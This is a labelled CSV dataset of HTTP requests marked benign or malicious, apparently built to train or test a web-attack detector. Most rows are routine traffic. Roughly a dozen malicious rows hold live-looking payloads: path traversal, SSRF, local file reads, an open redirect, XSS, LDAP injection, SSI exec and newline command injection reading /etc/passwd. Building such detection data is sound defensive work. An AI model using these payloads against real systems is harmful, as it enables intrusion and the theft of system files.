label,text
benign,"GET /forum/threads/view?forum_id=15&thread_id=29475&sort=latest_post&filter=unread&include_op=true&page=1&per_page=20&highlight_user=obscura87&show_signature=true&show_avatars=false&display_mode=compact&lang=en HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
DNT: 1"
benign,"GET /js/utils/helpers.js HTTP/1.1
Host: online-retail-store.biz
Accept: */*
Referer: https://online-retail-store.biz/products/electronics/cameras
User-Agent: curl/7.85.0
Connection: keep-alive"
benign,"POST /register-new HTTP/1.1
Host: event-signup-hub.online
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive

email=emily.rivera%40mailservice.net&promoCode="
benign,"GET /catalog/search?query=organic+green+tea&category=beverages&min_price=5&max_price=30&in_stock=true&sort=price_asc&page=3&limit=24&rating=4plus&promo_code=SPRING20&user_region=CA&currency=CAD&include_reviews=true HTTP/1.1
Host: pure-life-marketplace.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0"
benign,"GET /api/healthz HTTP/1.1
Host: realtime-data-streams.cloudgateway.net
User-Agent: Go-http-client/1.1
Accept: application/json
Connection: keep-alive"
benign,"GET /maps/coordinates?callback=processData&lat=40.7128&lon=-74.0060 HTTP/1.1
Host: geo-locator.io
Accept: application/javascript, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://geo-locator.io/search
Connection: keep-alive"
benign,"GET /recipes/find?ingredient=tomato&ingredient=basil&ingredient=mozzarella&diet=vegetarian HTTP/1.1
Host: freshfoodcorner.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
malicious,"GET /api/v2/settings/load HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://secure-user-portal.net/app/dashboard
Cookie: lang_selection=../../../../etc/nginx/nginx.conf%00default; token=3d2a7cd2518f9b"
benign,"GET /search_results?q=top+rated+hiking+backpacks+2024 HTTP/1.1
Host: trail-questing.ai
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html
Referer: https://trail-questing.ai/articles/outdoor-gear
Connection: keep-alive
DNT: 1"
malicious,"GET /serve?url=https://internal.stats-office.local/report?view=summary HTTP/1.1
Host: imageserver.trendy-shopworld.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15
Accept: image/*
Accept-Encoding: gzip, deflate
Cache-Control: no-cache"
benign,"GET /static/css/themes/dark-mode.css HTTP/1.1
Host: web-builder-platform.cloud
User-Agent: curl/7.87.0
Accept: */*
Referer: https://design-hubtool.io/dashboard/projects/12713/themes
Connection: keep-alive"
benign,"GET /forums/search?query=how%20to%20bake%20bread HTTP/1.1
Host: community.foodieforum.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Cookie: sessionid=bd7a892e45f020efa7d8ecab13
DNT: 1"
benign,"GET /collections/seasonal/items?material=cotton&material=wool&material=linen&style=casual HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://online-retail-store.biz/home
Connection: keep-alive"
benign,"POST /profile/edit HTTP/1.1
Host: tech-startup-hub.co.uk
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 421
Connection: close

username=alex_theron&display_name=Alex+Theron&email=alextheron%40tech-startup-hub.co.uk&phone=+447912345678&company=Innovate+Labs&job_title=CTO&website=https%3A%2F%2Falextheron.dev&bio=Founder+and+tech+enthusiast&location=London%2C+UK&twitter=%40alextheron&linkedin=alex-theron&github=alextheron&timezone=Europe%2FLondon&language=en&email_notifications=yes&sms_alerts=no&newsletter_subscribe=yes&two_factor_auth=yes&preferred_contact=email&timezone_offset=+0100&profile_visibility=public&session_timeout_minutes=20&dark_mode_enabled=false&beta_feature_access=true&backup_email=alex.backup%40mail.com&account_status=active&csrf_token=883dad84222f074d1b"
malicious,"GET /load_resource/file:///proc/self/environ HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"OPTIONS /services/weather/current HTTP/1.1
Host: api-climate-insights.org
Origin: https://dashboard.my-weather-app.net
Access-Control-Request-Method: GET
User-Agent: curl/7.85.0
Accept: */*
Connection: keep-alive"
benign,"GET /robots.txt HTTP/1.1
Host: student-resource-hub.edu
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/plain, text/*, */*
Accept-Language: en-US,en;q=0.5
Pragma: no-cache
Connection: keep-alive"
benign,"GET /user_uploads/pics/nature-scenery_2023_07_18.jpg HTTP/1.1
Host: greenleaf-photo-services.ai
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://greenleaf-photo-services.ai/gallery/landscapes
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Connection: keep-alive"
benign,"POST /poll/202/vote HTTP/1.1
Host: global-citizen-survey.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Origin: https://global-citizen-survey.org
Referer: https://global-citizen-survey.org/poll/202

poll_id=202&choice_id=3"
benign,"POST /profile/pictures/new HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Content-Type: multipart/form-data; boundary=--AaB03x
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/account/settings/avatar
Cookie: login_sid=ZXRlZXN0X2Fwan9fc2Vzcw==
Content-Length: 402
Connection: close

----AaB03x
Content-Disposition: form-data; name=""caption""

Headshot for profile update
----AaB03x
Content-Disposition: form-data; name=""image_file""; filename=""headshot_2024.jpg""
Content-Type: image/jpeg

(simulated binary image data)
----AaB03x
Content-Disposition: form-data; name=""album_id""

user_profile_photos
----AaB03x--"
benign,"POST /feedback/send HTTP/1.1
Host: techhelpdesk.supporthub.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Referer: https://techhelpdesk.supporthub.co/feedback
Origin: https://techhelpdesk.supporthub.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36
Cookie: session_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Connection: keep-alive

name=Javier+Martinez&email=javier.martinez%40supporthub.co&subject=Feature+Request&message=Could+you+add+a+dark+mode+option+to+the+dashboard+interface%3F+Thanks."
benign,"POST /api/v1/cart/update HTTP/1.1
Host: api.quickshop-hub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.VF8wMTIz.XyZAbcDe1234
Content-Type: application/json
Accept: application/json
Origin: https://quickshop-hub.io
X-Requested-With: FetchAPIClient
X-CSRF-Token: 5f2b6e1e7c984d7dbf93fbd5
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

{""itemId"": 9382, ""action"": ""addToCart""}"
benign,"GET /articles/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%81%AE%E8%AA%9E%E5%BD%99 HTTP/1.1
Host: insights-global-media.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: ja-JP,ja;q=0.8,en-US;q=0.6,en;q=0.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: keep-alive"
benign,"GET /forum/thread/%E4%BC%9A%E8%AD%B0%E8%AB%96%E5%A3%87 HTTP/1.1
Host: community-tech-talk.jp
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: ja-JP,ja;q=0.9,en-US;q=0.7,en;q=0.4
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community-tech-talk.jp/forums"
benign,"POST /community/new-post HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Accept: text/plain, */*; q=0.01
Accept-Language: en-GB,en;q=0.9
Content-Length: 143
Connection: keep-alive
Referer: https://community.game-dev-forum.org/forums/general-discussion
X-Requested-With: XMLHttpRequest

csrf_token=3aef4329dd2bc8fa6b7eea3ff&form_id=postCreate&timestamp=1686133021&post_title=New+Unity+Shader+Techniques&post_body=Sharing+a+couple+of+lightweight+shader+methods+I+just+learned.&return_url=%2Fforums%2Fgeneral-discussion"
benign,"GET /static/css/dashboard-theme-v3.css HTTP/1.1
Host: smart-city-infrastructure.gov
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://smart-city-infrastructure.gov/reports/monthly
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
DNT: 1"
benign,"POST /user-posts/comment HTTP/1.1
Host: urban-gardening.co.uk
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://urban-gardening.co.uk
Referer: https://urban-gardening.co.uk/user-posts/4781
Cookie: sid=12f7cd89ea26ff4a0273
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
X-CSRF-Token: d285b7adef9f9a5247a61c3c7e

author_name=Tommy+Green&comment_text=This+tip+about+composting+works+great+in+my+small+balcony+garden.+Thanks!"
benign,"PUT /api/v1/workspaces/3412/config HTTP/1.1
Host: api.foundation-ai.tech
Content-Type: application/json
Accept: application/json
Origin: https://studio.foundation-ai.tech
X-Requested-With: XMLHttpRequest
Authorization: Bearer a1b2c3d4e5f67890abcdef1234567890
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Connection: keep-alive

{""maxConcurrentJobs"":5,""enableLogging"":true,""defaultLanguage"":""en-US""}"
benign,"POST /api/v1/account/update-settings HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1Ni4fVkgiLCJwYXlsb2FkIjoiMTIzNDU2Nzg5MCJ9
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15
Content-Length: 110
Connection: keep-alive

{""user.profile-settings"":{""theme"":""dark"",""notifications.enabled"":true},""session-id"":""6a8f9d2e-e54b-4a79-b458-123abc456def""}"
benign,"PATCH /api/v1/articles/1345 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer sfdsk3920dfjs9fjiewr98f7b3
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Connection: keep-alive

[
  {""op"": ""replace"", ""path"": ""/title"", ""value"": ""Improving User Engagement with New Features""},
  {""op"": ""add"", ""path"": ""/tags/-"", ""value"": ""user-experience""}
]"
malicious,"GET /login?next=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://secure-user-portal.net/home
Connection: keep-alive"
benign,"OPTIONS /service/v4/accounts/74201/details HTTP/1.1
Host: api.authgate.network
Origin: https://client.office-portal.info
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
benign,"POST /api/v1/auth/login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 71

{""username"": ""jane.smith87"", ""password"": ""Sunshine2023!""}"
benign,"POST /account/security/change-password HTTP/1.1
Host: verified-payments.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/114.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Content-Length: 140
Connection: keep-alive
Referer: https://verified-payments.org/account/security
Cookie: auth_token=28ad98b9f7e3412f8a1b64fc

csrf_token=33d8feac8394a29e4b3db81a&form_id=changePassword&timestamp=1686134800&old_password=oldpass123&new_password=Str0ngPass!2024&return_url=%2Faccount%2Fdashboard"
benign,"PUT /api/v1/accounts/profiles/87921 HTTP/1.1
Host: secure.profile-portal.net
Authorization: Bearer VXNlck1hbmFnZXI6MjUxOQ==
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept-Encoding: gzip, br
DNT: 1
Connection: keep-alive
Content-Length: 178

<ProfileUpdate>
  <ProfileID>87921</ProfileID>
  <DisplayName>Jordan Miles</DisplayName>
  <NotificationSettings>
    <EmailNotifications>false</EmailNotifications>
    <PushNotifications>true</PushNotifications>
  </NotificationSettings>
  <PreferredLanguage>fr-FR</PreferredLanguage>
</ProfileUpdate>"
benign,"GET /videos/tutorials/javascript-basics HTTP/1.1
Host: devlearning-hub.org
User-Agent: Mozilla/5.0 (Linux; Android 9; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: cloud-sync-services.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Content-Type: application/json-patch+json
Content-Length: 47
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/sync/frequency"", ""value"": ""daily""}]"
benign,"POST /user/settings/update HTTP/1.1
Host: secure-login.clientnetwork.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Content-Language: en-US
Origin: https://secure-login.clientnetwork.uk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
Referer: https://secure-login.clientnetwork.uk/user/settings
Connection: close

email_notifications=enabled&timezone=America%2FChicago&privacy=standard"
benign,"PUT /api/data/item123 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: text/plain
Content-Length: 27
Accept: */*
Connection: keep-alive
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Updated item description text."
benign,"GET /api/v1/support/tickets?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: helpdesk.enterprise-solutions.net
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Connection: keep-alive"
benign,"GET /resources/styles/dashboard-theme.css HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://online-retail-store.biz/seller/home.html
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
malicious,"GET /out?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Origin: https://app.cloud-data-services.ai"
benign,"GET /images/logo.svg HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://community.game-dev-forum.org/forums/general-discussion
Connection: keep-alive"
benign,"POST /users/profile/edit HTTP/1.1
Host: creative-desk.space
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Connection: keep-alive
DNT: 1
Referer: https://creative-desk.space/users/profile
Origin: https://creative-desk.space
Cookie: token=Gt56yhnB9uplol3Ty6wsa4pMdoreCvX6; Secure; HttpOnly
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36

display_name=Lucas+Fernandez&bio=Graphic+designer+specializing+in+branding+and+UI.&website_url=https%3A%2F%2Flucasfernandez.design&location=Barcelona%2C+Spain"
malicious,"POST /users/query HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.9
Content-Type: application/json
Content-Length: 91
Connection: close
Referer: https://community.game-dev-forum.org/search
Cookie: session=3f1a9b7c8d2e4f6a0b5c7d8e9f1a2b3c

{""searchFilter"":""(cn=test_user)(objectClass=user))(|(uid=administrator)""}"
benign,"PUT /api/v3/blog/posts/8420 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer aBcDeFgHiJkLmNoPqRsTuVwXyZ123456
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Connection: close
Content-Length: 147

<?xml version=""1.0"" encoding=""UTF-8""?>
<post>
  <title>Understanding HTTP Protocols</title>
  <content>Updated content on HTTP methods and headers.</content>
  <tags>
    <tag>http</tag>
    <tag>networking</tag>
  </tags>
</post>"
benign,"POST /api/v1/user/contact HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
User-Agent: curl/7.85.0
Accept: */*
X-Requested-With: XMLHttpRequest
Connection: keep-alive

fullname=Samuel%20O%27Brien&phone=%2B1234567890&message=Looking%20for%20updates%20%26%20feedback%23thank%20you!"
benign,"GET /media/whitepapers/blockchain_technology_overview.pdf HTTP/1.1
Host: futuretech-insights.biz
Accept: application/pdf
Referer: https://futuretech-insights.biz/media/whitepapers/
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: digital-archive-solutions.tech
Accept-Encoding: br, gzip, deflate
Content-Type: text/plain
Content-Length: 29
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36
Origin: https://client.digital-archive-solutions.tech

Metadata updated for asset 442"
benign,"POST /ajax/v1/vote HTTP/1.1
Host: polls.public-feedback-platform.net
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Content-Length: 13
Connection: keep-alive

poll_id=612&option=2"
benign,"POST /api/v2/survey/submit HTTP/1.1
Host: insights.market-analytics.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

respondent_id=839217&feedback=%3Csuggestion%3EOffer+more+webinars+on+data+visualization.%3C%2Fsuggestion%3E&satisfied=true"
benign,"DELETE /api/v1/chats/room-67f28e8 HTTP/1.1
Host: realtime-messenger.community-chat-services.org
Authorization: Bearer 4l0q5k1337g12hxvyr8fcjma
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br"
benign,"POST /user/session/logout HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Referer: https://my-personal-blog-site.info/profile
Cookie: login_token=7a9f8e4bcd2a1f5e
User-Agent: curl/7.87.0
Content-Length: 21
Connection: close

csrf_token=ZmQyOXVweDkwMjI"
malicious,"GET /content/welcome.shtml?user_greeting=Hi%20there<!--#EXEC%20cmd=""id""--> HTTP/1.1
Host: legacy-portal-services.net
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /feedback/submit HTTP/1.1
Host: feedback-portal.org
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: identity
Content-Length: 66

comment=Great%20service%21%0auptime%0ancat%20%2Fetc%2Fpasswd"
benign,"POST /api/v1/js/analyticsTracker.js HTTP/1.1
Host: data-insights.updates.biz
Content-Type: application/javascript
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/javascript, */*;q=0.8
Content-Length: 36
Pragma: no-cache

console.log('Tracking event count incremented');"
benign,"POST /api/v2/goals/update HTTP/1.1
Host: personal-goals-tracker.io
Content-Type: application/json
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 74
Connection: keep-alive

{""daily_goals"": [""Meditate 10 minutes"",""Walk 5000 steps"",""Read 2 chapters of a novel""]}"
malicious,"POST /form/submit/signature HTTP/1.1
Host: advanced-token-authentication.securityhub.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept-Language: en-US,en;q=0.7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 205

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ"
benign,"POST /api/v1/subscribe/newsletter HTTP/1.1
Host: trusted-media-streaming.co
User-Agent: python-requests/2.31.0
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 164
Connection: keep-alive

email=newsubscriber%40streamco.net&preferences=%3CnewsletterPreferences%3E%3Cfrequency%3Eweekly%3C%2Ffrequency%3E%3Cgenres%3Eaction%2C+comedy%2C+drama%3C%2Fgenres%3E%3C%2FnewsletterPreferences%3E"
malicious,"GET /ldap_auth?username=%2A%29%28mail%3Dboss%40company.com%29%29%7C%28!(userPassword%3D*) HTTP/1.1
Host: cloud-hosting-services.us
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US
Accept-Encoding: gzip, deflate
Referer: https://cloud-hosting-services.us/ldap
Connection: keep-alive"
malicious,"POST /user/edit HTTP/1.1
Host: profiles.network-chat.app
User-Agent: Wget/1.21.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: https://profiles.network-chat.app/user/dashboard
Content-Length: 56

nickname=chatuser%0aps%20aux%20%7C%20grep%20python"
